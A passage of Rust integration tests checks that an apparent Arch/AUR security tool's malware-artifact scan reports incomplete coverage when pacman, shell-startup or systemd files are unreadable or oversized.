    fs::write(local.join("install"), [0xff, 0xfe, 0xfd]).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", cache)
        .env("AUR_PACMAN_LOCAL_DIR", home.path().join("pacman-local"))
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", home.path().join("systemd"))
        .env("AUR_TEST_CRON_ROOTS", home.path().join("cron"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .args(["scan", "malware-artifacts", "--quick", "--json"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(3));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["coverage_complete"], false);
    assert_eq!(json["roots_unreadable"], 1);
    assert_eq!(json["artifact_critical"], 0);
}

#[test]
fn persistence_decode_and_size_failures_mark_coverage_incomplete() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache");
    let local = home.path().join("pacman-local");
    let systemd = home.path().join("systemd");
    fs::create_dir_all(&cache).unwrap();
    fs::create_dir_all(&local).unwrap();
    fs::create_dir_all(&systemd).unwrap();
    fs::write(systemd.join("oversized.service"), vec![b'x'; 1_048_577]).unwrap();
    fs::write(home.path().join(".bashrc"), [0xff, 0xfe, 0xfd]).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", cache)
        .env("AUR_PACMAN_LOCAL_DIR", local)
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", systemd)
        .env("AUR_TEST_CRON_ROOTS", home.path().join("cron"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .args(["scan", "malware-artifacts", "--quick", "--json"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(3));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["coverage_complete"], false);
    assert_eq!(json["files_skipped_oversize"], 1);
    assert_eq!(json["roots_unreadable"], 1);
    assert_eq!(json["artifact_critical"], 0);
}
